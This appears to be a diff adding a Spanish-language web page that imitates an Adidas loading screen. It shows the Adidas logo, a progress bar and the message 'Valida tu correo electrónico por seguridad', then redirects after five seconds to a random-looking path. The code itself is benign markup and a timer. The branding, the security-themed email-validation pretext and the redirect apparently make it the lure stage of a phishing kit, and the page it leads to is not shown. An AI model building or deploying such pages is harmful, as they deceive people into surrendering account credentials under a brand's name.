@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adidas Logo Transition</title>
+    <style>
+        /* Estilos para el logo y el contenedor */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+
+        .logo {
+            width: 100px;
+            height: auto;
+            animation: blinker 1s linear infinite;
+            opacity: 0.5; /* Inicialmente semitransparente */
+        }
+
+        @keyframes blinker {
+            50% {
+                opacity: 1; /* Opacidad completa a la mitad del tiempo */
+            }
+        }
+
+        /* Estilos para la barra de carga */
+        .progress-bar-container {
+            height: 3px;
+            margin-top: 20px;
+            max-width: 150px;
+            width: 80%;
+            background-color: white; /* Fondo blanco */
+            border: 2px solid #000;
+            overflow: hidden;
+            border-radius: 5px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: black; /* Color de la barra de progreso */
+            transition: width 5s linear;
+        }
+    </style>
+</head>
+<body>
+
+<div class="logo-container">
+    <!-- Logo de Adidas en SVG -->
+    <img src="img/didas.svg" class="logo" alt="Adidas Logo">
+    
+    <!-- Barra de carga -->
+    <div class="progress-bar-container">
+        <div class="progress-bar" id="progress-bar"></div>
+        
+    </div>
+    <p style="font-family: sans-serif;color: #000;font-size: 15px;">Valida tu correo electr&oacute;nico por seguridad</p>
+
+</div>
+
+<script>
+    window.onload = function() {
+        // Iniciar la animación de la barra de carga cuando la página esté completamente cargada
+        const progressBar = document.getElementById("progress-bar");
+        setTimeout(function() {
+            progressBar.style.width = "100%"; // La barra se llenará en 30 segundos
+        }, 100); // Añadir un pequeño retraso para asegurar que la transición se active correctamente
+
+        // Después de 30 segundos, redirigir a otra página
+       setTimeout(function() {
+            window.location.href = "/Billos2tkYE/index.html"; // Cambia por la URL a la que desees redirigir
+        }, 5000); // 30000 milisegundos equivalen a 30 segundos
+    };
+</script>
+
+</body>
+</html>
